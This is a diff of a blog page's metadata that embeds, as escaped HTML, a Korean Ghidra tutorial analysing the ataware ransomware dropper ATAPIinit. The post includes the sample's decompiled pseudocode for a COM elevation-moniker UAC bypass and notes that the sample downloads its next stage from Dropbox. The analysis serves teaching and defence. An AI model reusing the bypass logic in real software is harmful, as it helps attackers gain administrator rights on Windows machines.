@@ -20,8 +20,515 @@
 
   <meta property="og:type" content="website"> 
   <meta property="og:title" content="[Research] Re:versing으로 시작하는 ghidra 생활 Part 4 - Malware Analysis (1) - hackyboiz">
-  <meta property="og:description" content="hack &amp; life">
-  <meta property="og:image" content="/img/favicon.ico">
+  <meta property="og:description" content="&lt;p&gt;&lt;strong&gt;&amp;#xB2E4;&amp;#xB978; &amp;#xD30C;&amp;#xD2B8; &amp;#xBCF4;&amp;#xB7EC;&amp;#xAC00;&amp;#xAE30;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/&#34;&gt;Re:versing&amp;#xC73C;&amp;#xB85C; &amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xB294; ghidra &amp;#xC0DD;&amp;#xD65C; Part 1 - Overview&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/&#34;&gt;Re:versing&amp;#xC73C;&amp;#xB85C; &amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xB294; ghidra &amp;#xC0DD;&amp;#xD65C; Part 2 - Data, Functions, Scripts&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/04/04/idioth/ghidra_part3/&#34;&gt;Re:versing&amp;#xC73C;&amp;#xB85C; &amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xB294; ghidra &amp;#xC0DD;&amp;#xD65C; Part 3 - tips for IDA User (Here!)&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Re:versing&amp;#xC73C;&amp;#xB85C; &amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xB294; ghidra &amp;#xC0DD;&amp;#xD65C; Part 4 - Malware Analysis (1) (Here!)&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/&#34;&gt;Re:versing&amp;#xC73C;&amp;#xB85C; &amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xB294; ghidra &amp;#xC0DD;&amp;#xD65C; Part 5 - Malware Analysis (2)&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&amp;#xBC18;&amp;#xAC11;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. 3&amp;#xC77C; &amp;#xB9CC;&amp;#xC5D0; &amp;#xBD59;&amp;#xB294;&amp;#xAD70;&amp;#xC694;. &amp;#xC77C;&amp;#xC694;&amp;#xC77C; &amp;#xBC88;&amp;#xC5ED; &amp;#xAE00;&amp;#xC5D0;&amp;#xC11C; &amp;#xB9D0;&amp;#xC500; &amp;#xB4DC;&amp;#xB838;&amp;#xB2E4;&amp;#xC2DC;&amp;#xD53C; ghidra &amp;#xAE00;&amp;#xC744; &amp;#xBE60;&amp;#xB974;&amp;#xAC8C;(?) &amp;#xC791;&amp;#xC131;&amp;#xC744; &amp;#xD574;&amp;#xC654;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xC0AC;&amp;#xC2E4;&amp;#xC0C1; &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD558;&amp;#xBA74;&amp;#xC11C; &amp;#xB290;&amp;#xB080; &amp;#xC810;&amp;#xC740; &amp;#xC544; &amp;#xC774;&amp;#xAC70; &amp;#xC77C;&amp;#xC77C;&amp;#xC774; &amp;#xB2E4; &amp;#xC138;&amp;#xC138;&amp;#xD558;&amp;#xAC8C; &amp;#xD558;&amp;#xBA74; &amp;#xBB54;&amp;#xAC00; &amp;#xC8FC;&amp;#xAC1D;&amp;#xC774; &amp;#xC804;&amp;#xB3C4;&amp;#xB418;&amp;#xB294; &amp;#xAC70; &amp;#xAC19;&amp;#xC740;&amp;#xB370;&amp;#x2026; ghidra &amp;#xAE00;&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xB77C; &amp;#xC545;&amp;#xC131;&amp;#xCF54;&amp;#xB4DC; &amp;#xBD84;&amp;#xC11D;&amp;#xC5D0; &amp;#xCD08;&amp;#xC810;&amp;#xC774; &amp;#xB9DE;&amp;#xCDB0;&amp;#xC9C0;&amp;#xB294; &amp;#xAC70; &amp;#xC544;&amp;#xB2CC;&amp;#xAC00;? &lt;del&gt;&amp;#xD2C0;&amp;#xB9B0; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xC788;&amp;#xC73C;&amp;#xBA74; &amp;#xC5B4;&amp;#xB5A1;&amp;#xD558;&amp;#xC9C0;&lt;/del&gt;&amp;#xB77C;&amp;#xB294; &amp;#xC0DD;&amp;#xAC01;&amp;#xC73C;&amp;#xB85C; &amp;#xC778;&amp;#xD574; &amp;#xAC00;&amp;#xBCCD;&amp;#xAC8C; &amp;#xC5B4;&amp;#xB5A0;&amp;#xD55C; &amp;#xC2DD;&amp;#xC73C;&amp;#xB85C; &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD558;&amp;#xAE30; &amp;#xD3B8;&amp;#xD558;&amp;#xAC8C; &amp;#xB514;&amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB7EC;&amp;#xB97C; &amp;#xC124;&amp;#xC815;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xC9C0;! &amp;#xC911;&amp;#xC810;&amp;#xC73C;&amp;#xB85C; &amp;#xB2E4;&amp;#xB8F0; &amp;#xC608;&amp;#xC815;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;p&gt;&amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD574;&amp;#xBCFC; &amp;#xC545;&amp;#xC131;&amp;#xCF54;&amp;#xB4DC;&amp;#xB294; ataware &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8; &amp;#x2192; ATAPIinit &amp;#x2192; ATAPIConfiguration &amp;#x2192; ATAPIUpdtr &amp;#xC21C;&amp;#xC73C;&amp;#xB85C; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB97C; &amp;#xB4DC;&amp;#xB86D;&amp;#xD558;&amp;#xACE0; &amp;#xC545;&amp;#xC131; &amp;#xD589;&amp;#xC704;&amp;#xB97C; &amp;#xC9C4;&amp;#xD589;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xAE00;&amp;#xC740; ghidra&amp;#xC5D0; &amp;#xAD00;&amp;#xB828;&amp;#xB41C; &amp;#xAE00;&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xB4A4;&amp;#xC5D0; &amp;#xC138; &amp;#xAC1C;&amp;#xC758; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB97C; &amp;#xBD84;&amp;#xC11D;&amp;#xD560; &amp;#xC608;&amp;#xC815;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xBC88; &amp;#xAC8C;&amp;#xC2DC;&amp;#xAE00;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; ATAPinit&amp;#xC5D0; &amp;#xB300;&amp;#xD574;&amp;#xC11C; &amp;#xB2E4;&amp;#xB8E8;&amp;#xC5B4; &amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;!&lt;/p&gt;
+&lt;h1 id=&#34;ghidra&amp;#xB97C;-&amp;#xD1B5;&amp;#xD574;-&amp;#xBD84;&amp;#xC11D;-&amp;#xACE0;&amp;#xACE0;&#34;&gt;&lt;a href=&#34;#ghidra&amp;#xB97C;-&amp;#xD1B5;&amp;#xD574;-&amp;#xBD84;&amp;#xC11D;-&amp;#xACE0;&amp;#xACE0;&#34; class=&#34;headerlink&#34; title=&#34;ghidra&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xBD84;&amp;#xC11D; &amp;#xACE0;&amp;#xACE0;&#34;&gt;&lt;/a&gt;ghidra&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xBD84;&amp;#xC11D; &amp;#xACE0;&amp;#xACE0;&lt;/h1&gt;&lt;p&gt;ATAPIinit &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB294; &lt;a href=&#34;https://app.any.run/tasks/e8e682e8-6d7f-42c8-ad3f-6afa980a77e3/&#34;&gt;app.any.run&lt;/a&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1B;&amp;#xC73C;&amp;#xC2E4; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xC77C;&amp;#xB2E8; &amp;#xBA3C;&amp;#xC800; &amp;#xD574;&amp;#xB2F9; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xC5D0; &amp;#xB300;&amp;#xD574;&amp;#xC11C; &amp;#xC54C;&amp;#xC544;&amp;#xBCF4;&amp;#xAE30; &amp;#xC704;&amp;#xD574; Detect It Easy&amp;#xC5D0; ATAPinit&amp;#xC744; &amp;#xB123;&amp;#xC5B4;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;MinGW&amp;#xB85C; &amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB418;&amp;#xC5C8;&amp;#xC73C;&amp;#xBA70;, 32&amp;#xBE44;&amp;#xD2B8; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
+&lt;p&gt;&amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xC744; &amp;#xD574;&amp;#xC11C; &amp;#xC5B4;&amp;#xB5A4; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xD558;&amp;#xB294;&amp;#xC9C0; &amp;#xB300;&amp;#xAC15; &amp;#xC720;&amp;#xCD94;&amp;#xB97C; &amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;. PEStudio&amp;#xB85C; &amp;#xD655;&amp;#xC778;&amp;#xC744; &amp;#xD574;&amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%201.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xB208;&amp;#xC5D0; &amp;#xB744;&amp;#xB294; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC740; &lt;code&gt;Elevation:Administrator!new:&lt;/code&gt;, &lt;code&gt;CLSIDFromString&lt;/code&gt;, &lt;code&gt;{6EDD6D74-C007-4E75-B76A-E5740995E24C}&lt;/code&gt;, &lt;code&gt;dl.dropboxusercontent.com&lt;/code&gt;&amp;#xC815;&amp;#xB3C4; &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;{6EDD6D74-C007-4E75-B76A-E5740995E24C}&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574;&amp;#xC11C; &amp;#xAD6C;&amp;#xAE00;&amp;#xC5D0; &amp;#xAC80;&amp;#xC0C9;&amp;#xC744; &amp;#xD574;&amp;#xBCF8; &amp;#xACB0;&amp;#xACFC; COM Interface&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; UAC bypass&amp;#xB97C; &amp;#xD558;&amp;#xB294; &amp;#xAE30;&amp;#xBC95;&amp;#xC5D0; &amp;#xB300;&amp;#xD574;&amp;#xC11C; &amp;#xB098;&amp;#xC624;&amp;#xB124;&amp;#xC694;. &lt;code&gt;Elevation:Administarator!new:&lt;/code&gt;&amp;#xC640; &amp;#xC5F0;&amp;#xACC4;&amp;#xD588;&amp;#xC744; &amp;#xB54C; COM&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; &amp;#xAD8C;&amp;#xD55C; &amp;#xC0C1;&amp;#xC2B9;&amp;#xC744; &amp;#xD55C; &amp;#xD6C4;, &lt;code&gt;dl.dropboxusercontent.com&lt;/code&gt; &amp;#xB9C1;&amp;#xD06C;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; ATAPIConfiguration&amp;#xC744; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;&amp;#xD55C;&amp;#xB2E4;&amp;#xB77C;&amp;#xACE0; &amp;#xC0DD;&amp;#xAC01;&amp;#xC744; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%202.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xC557;! &amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xC81C; &amp;#xB300;&amp;#xCDA9; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC791;&amp;#xC5C5;&amp;#xC744; &amp;#xD558;&amp;#xB294;&amp;#xC9C0; &amp;#xC54C;&amp;#xC558;&amp;#xC73C;&amp;#xB2C8; ghidra&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;. &amp;#x1F642;&lt;/p&gt;
+&lt;p&gt;&amp;#xC545;&amp;#xC131;&amp;#xCF54;&amp;#xB4DC; &amp;#xBD84;&amp;#xC11D; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; Variable/Function rename, Data type Redefine, Redefine Function Signature &amp;#xB4F1;&amp;#xC758; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xB9CE;&amp;#xC774; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC608;&amp;#xC815;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC880; &amp;#xB354; &amp;#xBCF4;&amp;#xAE30; &amp;#xD3B8;&amp;#xD558;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xAE30; &amp;#xC704;&amp;#xD574;&amp;#xC11C;&amp;#xC694;!&lt;/p&gt;
+&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xC0C8; &amp;#xD504;&amp;#xB85C;&amp;#xC81D;&amp;#xD2B8;(&amp;#xC800;&amp;#xC758; &amp;#xACBD;&amp;#xC6B0; ataware&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.)&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD55C; &amp;#xD6C4; ATAPIinit&amp;#xC744; &amp;#xCD94;&amp;#xAC00;&amp;#xD558;&amp;#xACE0; &amp;#xC5F4;&amp;#xC5B4;&amp;#xC11C; analysis&amp;#xB97C; &amp;#xD569;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%203.png&#34; alt&gt;&lt;/p&gt;
+&lt;h2 id=&#34;UAC-Bypass-&amp;#xD568;&amp;#xC218;&#34;&gt;&lt;a href=&#34;#UAC-Bypass-&amp;#xD568;&amp;#xC218;&#34; class=&#34;headerlink&#34; title=&#34;UAC Bypass &amp;#xD568;&amp;#xC218;&#34;&gt;&lt;/a&gt;UAC Bypass &amp;#xD568;&amp;#xC218;&lt;/h2&gt;&lt;p&gt;Aggressive Instruction Finder&amp;#xB294; &amp;#xCCB4;&amp;#xD06C;&amp;#xAC00; &amp;#xD480;&amp;#xB824;&amp;#xC788;&amp;#xC73C;&amp;#xB2C8; &amp;#xCCB4;&amp;#xD06C;&amp;#xB97C; &amp;#xD558;&amp;#xACE0; Analyze&amp;#xB97C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%204.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;entry&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;FUN_00401570&lt;/code&gt;&amp;#xC744; &amp;#xCC3E;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xC911;&amp;#xC810;&amp;#xC801;&amp;#xC73C;&amp;#xB85C;(?) &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD574;&amp;#xBCFC; &amp;#xACC4;&amp;#xD68D;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD074;&amp;#xB9AD;&amp;#xC744; &amp;#xD574;&amp;#xC11C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xBA74; &amp;#xC5EC;&amp;#xB7EC; &amp;#xAC1C;&amp;#xC758; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;undefined4 &lt;span class=&#34;hljs-title&#34;&gt;FUN_00401570&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+  FUN_0040da90();
+  DAT_00416020 = FUN_00410ab0(&lt;span class=&#34;hljs-number&#34;&gt;0x20a&lt;/span&gt;);
+  DAT_00416024 = FUN_00410ab0(&lt;span class=&#34;hljs-number&#34;&gt;0x20a&lt;/span&gt;);
+  FUN_00401657(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+  FUN_004017e4();
+  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xADF8;&amp;#xC911;&amp;#xC5D0;&amp;#xC11C; &amp;#xC544;&amp;#xAE4C; &amp;#xC704;&amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD588;&amp;#xB358; &amp;#xBD80;&amp;#xBD84;&amp;#xC778; COM&amp;#xC744; &amp;#xC774;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; UAC&amp;#xB97C; &amp;#xC6B0;&amp;#xD68C;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;! &lt;code&gt;FUN_004017e4()&lt;/code&gt;&amp;#xB85C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xC2DC;&amp;#xBA74; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCC98;&amp;#xC74C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC14;&amp;#xC744; &amp;#xB54C;, &amp;#xB514;&amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB7EC;&amp;#xC5D0;&amp;#xC11C; &amp;#xB098;&amp;#xC624;&amp;#xB294; &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;FUN_004017e4&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+  HMODULE pHVar1;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; iVar2;
+  undefined *puVar3;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; **ppiVar4;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; local_27c [&lt;span class=&#34;hljs-number&#34;&gt;260&lt;/span&gt;];
+  undefined4 local_74 [&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;];
+  undefined4 local_60;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *local_50;
+  undefined local_4c [&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;];
+  undefined local_3c [&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;];
+  FARPROC local_2c;
+  FARPROC local_28;
+  FARPROC local_24;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; local_20;
+  FARPROC local_1c;
+  HMODULE local_18;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; local_14;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; local_10;
+  
+  local_10 = &lt;span class=&#34;hljs-number&#34;&gt;0x80004005&lt;/span&gt;;
+  local_14 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+  local_50 = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;;
+  local_18 = LoadLibraryA(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ole32.dll&amp;quot;&lt;/span&gt;);
+  local_1c = GetProcAddress(local_18,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CoInitializeEx&amp;quot;&lt;/span&gt;);
+  ppiVar4 = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; **)&lt;span class=&#34;hljs-number&#34;&gt;0x6&lt;/span&gt;;
+  puVar3 = (undefined *)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;;
+  local_20 = (*local_1c)(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;);
+  pHVar1 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;Ole32.dll&amp;quot;&lt;/span&gt;);
+  local_24 = GetProcAddress(pHVar1,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CLSIDFromString&amp;quot;&lt;/span&gt;);
+  pHVar1 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;Ole32.dll&amp;quot;&lt;/span&gt;);
+  local_28 = GetProcAddress(pHVar1,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;IIDFromString&amp;quot;&lt;/span&gt;);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt; {
+    iVar2 = (*local_24)(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;{3E5FC7F9-9A51-4367-9063-A120244FBEC7}&amp;quot;&lt;/span&gt;,local_4c,puVar3,ppiVar4);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ((iVar2 != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) ||
+       (iVar2 = (*local_28)(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;{6EDD6D74-C007-4E75-B76A-E5740995E24C}&amp;quot;&lt;/span&gt;,local_3c), iVar2 != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)) &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
+    FUN_0040f860((undefined *)local_27c,&lt;span class=&#34;hljs-number&#34;&gt;0x208&lt;/span&gt;);
+    wcscpy(local_27c,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;Elevation:Administrator!new:&amp;quot;&lt;/span&gt;);
+    wcscat(local_27c,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;{3E5FC7F9-9A51-4367-9063-A120244FBEC7}&amp;quot;&lt;/span&gt;);
+    FUN_0040f860((undefined *)local_74,&lt;span class=&#34;hljs-number&#34;&gt;0x24&lt;/span&gt;);
+    local_74[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x24&lt;/span&gt;;
+    local_60 = &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
+    pHVar1 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;Ole32.dll&amp;quot;&lt;/span&gt;);
+    local_2c = GetProcAddress(pHVar1,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CoGetObject&amp;quot;&lt;/span&gt;);
+    ppiVar4 = &amp;amp;local_50;
+    puVar3 = local_3c;
+    local_10 = (*local_2c)(local_27c,local_74);
+    FUN_00401a0f();
+    local_10 = (**(code **)(*local_50 + &lt;span class=&#34;hljs-number&#34;&gt;0x24&lt;/span&gt;))(local_50,DAT_00416028,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;);
+  } &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; (local_14 != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (local_50 != (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;) {
+    (**(code **)(*local_50 + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;))(local_50);
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;GetProcAddress&lt;/code&gt;&amp;#xB85C; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC640;&amp;#xC11C;&amp;#x2026; &amp;#xD568;&amp;#xC218; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB85C; &amp;#xC2E4;&amp;#xD589;&amp;#xC744; &amp;#xD558;&amp;#xB294;&amp;#xB370; &amp;#xBB50;&amp;#xAC00; &amp;#xBB34;&amp;#xC5C7;&amp;#xC744; &amp;#xD558;&amp;#xB294;&amp;#xC9C0;  &amp;#xB208;&amp;#xC5D0; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xAE30;&amp;#xAC00; &amp;#xC5B4;&amp;#xB835;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB7F4; &amp;#xB54C;&amp;#xB294; Rename Variable (L)&amp;#xACFC; Retype Variable (Ctrl + L)&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xD55C;&amp;#xB208;&amp;#xC5D0; &amp;#xBCF4;&amp;#xAE30; &amp;#xC27D;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E4; &amp;#xC218;&amp;#xB3C4; &amp;#xC788;&amp;#xACE0;, &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB85C; &amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xB294; &amp;#xAC12;&amp;#xB4E4;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xD0C0;&amp;#xC785;&amp;#xB3C4; &amp;#xC790;&amp;#xB3D9;&amp;#xC73C;&amp;#xB85C; &amp;#xB9DE;&amp;#xCDB0; &amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/05/19/idioth/ghidra_part4/Untitled%205.png&#34; alt&gt;&lt;/p&gt;
